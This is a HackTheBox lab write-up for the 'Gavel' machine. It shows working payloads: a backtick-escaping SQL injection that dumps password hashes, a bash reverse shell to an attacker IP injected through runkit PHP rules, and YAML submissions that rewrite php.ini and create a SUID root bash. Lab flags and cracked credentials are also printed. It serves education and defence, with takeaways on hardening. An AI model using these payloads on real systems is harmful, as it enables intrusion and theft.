# HackTheBox - Gavel Machine Writeup

![Gavel Banner](https://labs.hackthebox.com/storage/avatars/...)

## Machine Information

- **Machine Name:** Gavel
- **Difficulty:** Medium
- **Operating System:** Linux (Ubuntu)
- **IP Address:** 10.129.242.203
- **Attack Path:** Web Exploitation → SQL Injection → RCE → Privilege Escalation

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Foothold - Web Exploitation](#initial-foothold)
3. [SQL Injection Discovery](#sql-injection-discovery)
4. [Exploiting SQL Injection](#exploiting-sql-injection)
5. [Hash Cracking](#hash-cracking)
6. [Getting Shell - RCE via Admin Panel](#getting-shell)
7. [Privilege Escalation - User (auctioneer)](#privilege-escalation-user)
8. [Privilege Escalation - Root](#privilege-escalation-root)
9. [Flags](#flags)
10. [Key Takeaways](#key-takeaways)
11. [Tools Used](#tools-used)

---

## Reconnaissance

### Initial Port Scan

Let's start with a comprehensive Nmap scan to identify open ports and services:

```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn 10.129.242.203 -oN nmap_scan.txt
```

**Command Breakdown:**
- `-p-` = Scan all 65535 ports
- `--min-rate=10000` = Send packets at least 10,000 per second (faster scanning)
- `-T5` = Aggressive timing template
- `-sCV` = Run service version detection (-sV) and default scripts (-sC)
- `-Pn` = Skip ping, treat host as online
- `-oN` = Output to normal format file

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
```

**Analysis:**
- **Port 22 (SSH):** OpenSSH 8.9p1 - Will need credentials to access
- **Port 80 (HTTP):** Apache web server redirecting to `gavel.htb` - This is our primary attack surface

---

### Adding Domain to /etc/hosts

The web server redirects to `gavel.htb`, so we need to add this to our hosts file:

```bash
echo "10.129.242.203 gavel.htb" | sudo tee -a /etc/hosts
```

**Why:** DNS resolution - tells our system that `gavel.htb` points to the target IP.

---

### Web Reconnaissance

#### Manual Inspection

Visit `http://gavel.htb` in your browser:

**Observations:**
- Auction website called "Gavel"
- Has login/register functionality
- Three active auction items with countdown timers
- Page auto-refreshes constantly
- Mentions "Rule Engine" in description

#### Directory Enumeration

```bash
feroxbuster -u http://gavel.htb -w /usr/share/wordlists/dirb/common.txt -o feroxbuster_scan.txt
```

**Command Breakdown:**
- `-u` = Target URL
- `-w` = Wordlist to use
- `-o` = Output file

**Key Findings:**
- `/admin.php` - Admin panel (requires authentication)
- `/login.php` - Login page
- `/register.php` - Registration page
- `/inventory.php` - User inventory
- `/bidding.php` - Auction bidding page
- `/.git/` - **EXPOSED GIT REPOSITORY!** 🚨

---

### Nuclei Scan

```bash
nuclei -u http://gavel.htb -o nuclei_scan.txt
```

**Purpose:** Automated vulnerability scanning for known issues.

---

## Critical Discovery: Exposed Git Repository

### What is an Exposed .git Directory?

When developers deploy a Git repository to a web server without properly securing it, the `.git/` directory becomes publicly accessible. This directory contains:
- Complete source code
- Commit history
- Configuration files
- **Potentially sensitive information like passwords!**

### Downloading the Repository

We'll use `git-dumper` to extract the entire repository:

```bash
mkdir git_repo
git-dumper http://gavel.htb/.git/ git_repo
```

**What this does:**
- Recursively downloads all Git objects
- Reconstructs the complete repository locally
- Gives us access to all source code and commit history

**Output:**
```
[-] Fetching .git/HEAD
[-] Fetching .git/objects/...
[-] Running git checkout .
Updated 1849 paths from the index
```

**1849 files extracted!** Now we have the complete application source code.

---

## Source Code Analysis

### Key Files Discovered

```bash
cd git_repo
ls -la
```

**Important files:**
- `admin.php` - Admin panel for modifying auction rules
- `includes/bid_handler.php` - Processes bids
- `includes/config.php` - **Database credentials!**
- `includes/auction_watcher.php` - Automated auction management
- `inventory.php` - User inventory management
- `rules/default.yaml` - Default auction rules

### Database Credentials Found

```bash
cat includes/config.php
```

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');
```

**Note:** These credentials are for MySQL, which is only accessible locally. We'll need them later.

---

## Initial Foothold

### Account Registration

Since we don't have credentials yet, let's register an account:

1. Visit `http://gavel.htb/register.php`
2. Register username: `hacker`
3. Set a password (e.g., `password123`)
4. You receive **50,000 coins** upon registration

### Exploring the Application

After logging in, explore the available pages:

**Bidding Page (`/bidding.php`):**
- Shows 3 active auctions
- Each has a countdown timer
- Page constantly refreshes
- Bidding form is difficult to use due to auto-refresh

**Inventory Page (`/inventory.php`):**
- Shows items you've won
- Has a "Sort by" dropdown (item_name or quantity)
- Hidden `user_id` parameter in the sort form 🚨

---

## SQL Injection Discovery

### Finding the Vulnerability

While exploring `inventory.php`, we notice something interesting in the page source:

```html
<form action="" method="POST" class="form-inline" id="sortForm">
    <input type="hidden" name="user_id" value="2">
    <select name="sort" id="sort" class="form-control">
        <option value="item_name">Name</option>
        <option value="quantity">Quantity</option>
    </select>
</form>
```

**Two parameters are user-controlled:**
1. `user_id` - Our user ID
2. `sort` - The column to sort by

### Analyzing the Source Code

From the Git repository, let's examine `inventory.php`:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

if ($sortItem === 'quantity') {
    $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
    $stmt->execute([$userId]);
} else {
    $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
    $stmt->execute([$userId]);
}
```

**Vulnerability Analysis:**

1. **Line 3:** `$col` is built by wrapping `$sortItem` in backticks
2. **Only backticks (`) are removed** - No other input validation!
3. **Line 10:** `$col` is inserted DIRECTLY into the SQL query
4. **This happens BEFORE** the query is prepared
5. The `user_id` parameter IS safely parameterized (line 11)

**This is SQL Injection via column name manipulation!**

---

## Exploiting SQL Injection

### Understanding the Challenge

The vulnerability is tricky because:
- The injection point is wrapped in backticks: `` SELECT `$col` FROM ... ``
- We can't easily break out with standard techniques
- We need a **nested subquery** approach

### The Working Payload

After much testing, the correct payload structure is:

```
user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- -
sort=?;-- -
```

**How it works:**

**Original Query:**
```sql
SELECT `?` FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

**After Injection:**
```sql
SELECT `?` FROM inventory WHERE user_id = x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- -
```

**Breakdown:**
1. We close the backtick with `` x` ``
2. We inject `FROM (SELECT ... )y` to create a derived table
3. Inside, we use `group_concat()` to concatenate all usernames and passwords
4. We create a column alias `` `'x` `` (backtick + quote + x + backtick)
5. Comment out the rest with `-- -`

### Executing the SQL Injection

In your browser, navigate to:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`'x`+FROM+users)y;--+-&sort=?;--+-
```

**Result in the page:**

```html
<strong>auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS,hacker:$2y$10$JD3tlAD1QzVK1b2zEETfceHgngTC9ObFahHvP25sVSBQ2P5KLeBEC</strong>
```

**We extracted:**
- Username: `auctioneer`
- Password hash: `$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS`

---

## Hash Cracking

### Identifying the Hash Type

The hash format `$2y$10$...` indicates **bcrypt** hashing algorithm.

**What is bcrypt?**
- Modern password hashing algorithm
- Designed to be slow (intentional)
- Includes salt to prevent rainbow table attacks
- Format: `$2y$[cost]$[salt][hash]`

### Saving the Hash

```bash
cd /home/kali/Labs/Machines/Gavel
echo 'auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > hash.txt
```

### Cracking with John the Ripper

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Command Breakdown:**
- `--format=bcrypt` = Specify hash algorithm
- `--wordlist=` = Dictionary file to use
- `hash.txt` = File containing the hash

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
midnight1        (auctioneer)
```

**Credentials Found:** `auctioneer:midnight1` 🎉

---

## Getting Shell - RCE via Admin Panel

### Logging in as Auctioneer

1. Visit `http://gavel.htb/login.php`
2. Enter credentials:
   - Username: `auctioneer`
   - Password: `midnight1`
3. Successfully logged in!

### Accessing Admin Panel

Navigate to `http://gavel.htb/admin.php`

**What we see:**
- List of 3 active auctions
- Each auction has:
  - Item name
  - Current price
  - Time remaining
  - **Rule** field (editable)
  - **Message** field (editable)
  - "Edit" button

### Understanding the RCE Vulnerability

From the source code (`includes/bid_handler.php`):

```php
$rule = $auction['rule'];

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    $allowed = false;
}
```

**Vulnerability:**
- `runkit_function_add()` creates a PHP function dynamically
- The **third parameter** (`$rule`) is the **function body**
- This `$rule` comes directly from the database
- **We can inject arbitrary PHP code through the admin panel!**

### Crafting the Exploit

**Original rule example:**
```php
return $current_bid >= $previous_bid * 1.1;
```

**Our malicious rule:**
```php
system('bash -c "bash -i >& /dev/tcp/10.10.16.14/4444 0>&1"'); return true;
```

**What this does:**
- Executes a bash reverse shell
- Connects back to our Kali machine on port 4444
- Always returns `true` so the bid is accepted

### Setting Up the Listener

On your Kali machine:

```bash
nc -lvnp 4444
```

**Command breakdown:**
- `nc` = Netcat utility
- `-l` = Listen mode
- `-v` = Verbose output
- `-n` = No DNS resolution
- `-p 4444` = Listen on port 4444

### Injecting the Payload

1. In the admin panel, select any auction
2. Clear the **Rule** field
3. Paste the payload:
   ```php
   system('bash -c "bash -i >& /dev/tcp/10.10.16.14/4444 0>&1"'); return true;
   ```
4. Click **Edit** to save

### Triggering the RCE

1. Go to `http://gavel.htb/bidding.php`
2. Find the auction you modified
3. Enter a bid amount (higher than current price)
4. Click "Place Bid"

**Result:** Your netcat listener receives a connection!

```bash
listening on [any] 4444 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.242.203] 54321
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gavel:/var/www/html/gavel/includes$
```

**We have shell as `www-data`!** 🎉

---

## Privilege Escalation - User (auctioneer)

### Stabilizing the Shell

First, let's make the shell more usable:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Press `Ctrl+Z`, then:
```bash
stty raw -echo; fg
```
Press Enter twice.

**Now you have a fully interactive shell!**

### Enumeration as www-data

#### Check Current User
```bash
id
```
Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

#### List Home Directories
```bash
ls -la /home/
```
Output:
```
drwxr-x--- 2 auctioneer auctioneer 4096 Nov  5 12:46 auctioneer
```

**There's an `auctioneer` user!** We have the password (`midnight1`) from earlier.

### Switching to Auctioneer User

```bash
su - auctioneer
```
Enter password: `midnight1`

**Success!**
```bash
auctioneer@gavel:~$
```

### Getting User Flag

```bash
ls -la
cat user.txt
```

**User Flag:** `d783bbb4b36ed0b382a54a70c0be1c23` 🚩

---

## Privilege Escalation - Root

### Initial Enumeration

#### Check Sudo Rights
```bash
sudo -l
```
Output: `Sorry, user auctioneer may not run sudo on gavel.`

**No sudo access.**

#### Check User Groups
```bash
id
```
Output:
```
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

**Interesting!** We're in the `gavel-seller` group. This is likely significant.

#### Check SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Result:** Only standard system binaries - nothing exploitable.

### Exploring /opt/gavel/

```bash
ls -la /opt/gavel/
```

Output:
```
drwxr-xr-x 4 root root  4096 .
drwxr-xr-x 3 root root  4096 ..
drwxr-xr-x 3 root root  4096 .config
-rwxr-xr-- 1 root root 35992 gaveld
-rw-r--r-- 1 root root   364 sample.yaml
drwxr-x--- 2 root root  4096 submission
```

**Key files:**
- `gaveld` - Custom daemon running as root
- `sample.yaml` - Example YAML file
- `submission/` - Directory (we can't access)
- `.config/php/php.ini` - PHP configuration

#### Check Running Processes

```bash
ps aux | grep root | grep gavel
```

Output:
```
root  1014  /bin/bash /root/scripts/auction_watcher.sh
root  1015  /opt/gavel/gaveld
root  1034  python3 /root/scripts/timeout_gavel.py
```

**The `gaveld` daemon is running as root!**

### Finding Files Owned by gavel-seller Group

```bash
find / -group gavel-seller 2>/dev/null
```

Output:
```
/run/gaveld.sock
/usr/local/bin/gavel-util
```

**JACKPOT!** 🎯

1. `/run/gaveld.sock` - Unix socket for gaveld communication
2. `/usr/local/bin/gavel-util` - Utility program (we can execute this!)

### Analyzing gavel-util

```bash
/usr/local/bin/gavel-util
```

Output:
```
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

**This is how we submit items to gaveld!**

### Checking sample.yaml

```bash
cat /opt/gavel/sample.yaml
```

```yaml
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher..."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

**Notice:** This has a `rule` field that contains PHP code!

### Checking PHP Configuration

```bash
cat /opt/gavel/.config/php/php.ini
```

```ini
engine=On
display_errors=On
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,popen,...
allow_url_fopen=Off
```

**Restrictions:**
- `open_basedir=/opt/gavel` - Can only access files in `/opt/gavel/`
- `disable_functions=` - Many dangerous functions disabled
- But NOT ALL functions are disabled!

### The Attack Plan

**Strategy:**
1. Submit a YAML file that **modifies the PHP configuration** to remove restrictions
2. Submit another YAML file with **malicious PHP code** to create a SUID bash
3. Execute the SUID bash to become root

---

### Step 1: Disable PHP Restrictions

#### Creating the YAML File

On your **Kali machine:**

```bash
cd /home/kali/Labs/Machines/Gavel

cat > fix_ini.yaml << 'EOF'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
EOF
```

**What this does:**
- `file_put_contents()` - Writes to php.ini file
- Sets `open_basedir=` (empty = no restriction)
- Sets `disable_functions=` (empty = all functions enabled)
- Returns `false` (important for validation)

**Why this works:**
- `file_put_contents()` is NOT in the disable_functions list
- We can write to `/opt/gavel/.config/php/php.ini` (within open_basedir)
- gaveld runs as root, so the PHP code executes with root privileges

#### Transferring the File

Start HTTP server on Kali:
```bash
python3 -m http.server 8000
```

On the target (as auctioneer):
```bash
cd /tmp
wget http://10.10.16.14:8000/fix_ini.yaml
```

#### Submitting the YAML

```bash
/usr/local/bin/gavel-util submit fix_ini.yaml
```

Output: `Item submitted for review in next auction`

Wait a few seconds for gaveld to process it:
```bash
sleep 3
```

#### Verify Restrictions Removed

```bash
cat /opt/gavel/.config/php/php.ini
```

Expected output:
```ini
engine=On
display_errors=On
open_basedir=
disable_functions=
```

**Success!** All restrictions are now removed. ✅

---

### Step 2: Create SUID Bash

#### Creating the Exploit YAML

On your **Kali machine:**

```bash
cat > final_exploit.yaml << 'EOF'
name: rootshell
description: suid bash
image: "x.png"
price: 1
rule_msg: "rooting"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF
```

**What this does:**
- `system()` - Executes shell commands (now enabled!)
- `cp /bin/bash /opt/gavel/rootbash` - Copy bash to /opt/gavel/
- `chmod u+s /opt/gavel/rootbash` - Set SUID bit (runs as root!)
- Returns `false`

**Why /opt/gavel/?**
- Originally, open_basedir restricted us to this directory
- Even though we removed the restriction, it's safer to work here
- This ensures compatibility

#### Transferring the File

On the target:
```bash
wget http://10.10.16.14:8000/final_exploit.yaml
```

#### Submitting the Exploit

```bash
/usr/local/bin/gavel-util submit final_exploit.yaml
```

Output: `Item submitted for review in next auction`

Wait for processing:
```bash
sleep 3
```

#### Verify SUID Bash Created

```bash
ls -la /opt/gavel/rootbash
```

Expected output:
```
-rwsr-xr-x 1 root root 1234567 Jan 27 08:00 /opt/gavel/rootbash
```

**The `s` in permissions means SUID is set!** ✅

---

### Step 3: Execute SUID Bash and Get Root

```bash
/opt/gavel/rootbash -p
```

**Important:** The `-p` flag preserves the SUID privileges!

**Result:**
```bash
rootbash-5.1# id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) groups=1002(auctioneer),1001(gavel-seller)
```

**Notice:** `euid=0(root)` - We have root privileges! 🎉👑

### Getting Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `3dfbd871c3305ad6264a7ae12ea15c38` 🚩

---

## Flags

| Flag | Hash |
|------|------|
| **User Flag** | `d783bbb4b36ed0b382a54a70c0be1c23` |
| **Root Flag** | `3dfbd871c3305ad6264a7ae12ea15c38` |

---

## Key Takeaways

### 1. Exposed Git Repositories are Critical

**Why it matters:**
- Complete source code access
- Commit history may contain secrets
- Configuration files reveal infrastructure
- **Always check for `/.git/` directory on web applications!**

**How to protect:**
- Never deploy `.git/` to production
- Use `.gitignore` properly
- Implement web server rules to block `.git` access

### 2. Complex SQL Injection - Nested Subqueries

**What we learned:**
- Standard SQL injection techniques don't always work
- Column name injection is possible but tricky
- Nested subqueries can bypass restrictions
- Always test multiple injection vectors

**The winning payload:**
```
user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- -
```

**Key technique:** Creating a derived table to extract data when traditional methods fail.

### 3. PHP Dynamic Function Creation (runkit)

**The vulnerability:**
```php
runkit_function_add('ruleCheck', '$params', $user_controlled_code);
```

**Why it's dangerous:**
- Allows arbitrary PHP code execution
- User input becomes function body
- No input validation = RCE

**Lesson:** Never pass user input to functions that execute code dynamically!

### 4. Defense in Depth Failure

**The privilege escalation chain:**
1. Removed `open_basedir` restriction via YAML submission
2. Removed `disable_functions` restriction
3. Used newly-enabled `system()` function
4. Created SUID binary

**What went wrong:**
- PHP restrictions could be modified by the application itself
- Configuration file was writable by the daemon
- No monitoring of critical configuration changes

**Better defense:**
- Configuration files should be immutable at runtime
- Use mandatory access control (AppArmor/SELinux)
- Monitor critical file modifications

### 5. Unix Sockets and Daemon Communication

**What we learned:**
- System daemons often use Unix sockets for IPC
- Tools may exist for users to interact with privileged daemons
- The `gavel-seller` group had access to `/usr/local/bin/gavel-util`
- This utility communicated with root daemon via socket

**Lesson:** Always check what utilities are available and what groups can execute them!

---

## Tools Used

### Reconnaissance
- **Nmap** - Port scanning and service enumeration
- **Feroxbuster** - Directory brute-forcing
- **Nuclei** - Automated vulnerability scanning

### Exploitation
- **git-dumper** - Extracting exposed Git repositories
- **Burp Suite** - Intercepting and modifying HTTP requests
- **Browser DevTools** - Manual SQL injection testing
- **John the Ripper** - Password hash cracking

### Post-Exploitation
- **Netcat** - Reverse shell listener
- **Python HTTP Server** - File transfer
- **Standard Linux utilities** - Enumeration and privilege escalation

---

## Attack Chain Summary

```
1. Port Scan (Nmap) → Found HTTP (80) and SSH (22)
                ↓
2. Directory Enum → Discovered /.git/ exposed
                ↓
3. Git Repository Extraction (git-dumper) → Got source code
                ↓
4. Source Code Analysis → Found SQL injection in inventory.php
                ↓
5. SQL Injection Exploitation → Extracted auctioneer password hash
                ↓
6. Hash Cracking (John) → Got credentials: auctioneer:midnight1
                ↓
7. Login as Auctioneer → Access to admin.php
                ↓
8. PHP RCE via Admin Panel → Modified auction rule with reverse shell
                ↓
9. Got Shell as www-data → Triggered RCE by placing bid
                ↓
10. Switch User → su to auctioneer with password midnight1
                ↓
11. Found gavel-util → Discovered YAML submission mechanism
                ↓
12. Disable PHP Restrictions → Submitted YAML to modify php.ini
                ↓
13. Create SUID Bash → Submitted exploit YAML with system() call
                ↓
14. Execute SUID Bash → Got root shell
                ↓
15. ROOT FLAG! 🎉
```

---

## Additional Resources

### Understanding SQL Injection
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

### Git Repository Security
- [Securing Git Repositories](https://www.atlassian.com/git/tutorials/git-security)
- [git-dumper Tool](https://github.com/arthaud/git-dumper)

### PHP Security
- [PHP Disable Functions Bypass](https://www.php.net/manual/en/ini.core.php#ini.disable-functions)
- [Runkit PHP Extension](https://www.php.net/manual/en/book.runkit.php)

### Linux Privilege Escalation
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [SUID Exploitation](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

---

## Conclusion

The Gavel machine demonstrated multiple real-world vulnerabilities:

1. **Exposed Git repositories** leading to complete source code disclosure
2. **Advanced SQL injection** requiring nested subquery techniques
3. **Weak password hashing** (though bcrypt is strong, weak password was the issue)
4. **PHP code injection** via dynamic function creation
5. **Misconfigured privilege separation** allowing configuration modification

**Key Skills Practiced:**
- Advanced SQL injection techniques
- Source code analysis for vulnerability discovery
- PHP exploitation and bypass techniques
- Linux privilege escalation via daemon exploitation
- Chaining multiple vulnerabilities for complete system compromise

This machine perfectly illustrates why **defense in depth** is critical - a single vulnerability might be contained, but chaining multiple issues leads to full compromise.

---

## Author Notes

This writeup was created for educational purposes. The techniques described should only be used in authorized penetration testing scenarios or on systems you own.

**Happy Hacking! 🥋**

*"The master has failed more times than the student has even tried."*

---

**Date:** January 27, 2026  
**Machine:** Gavel (HackTheBox)  
**Difficulty:** Medium  
**Creator:** HackTheBox Team
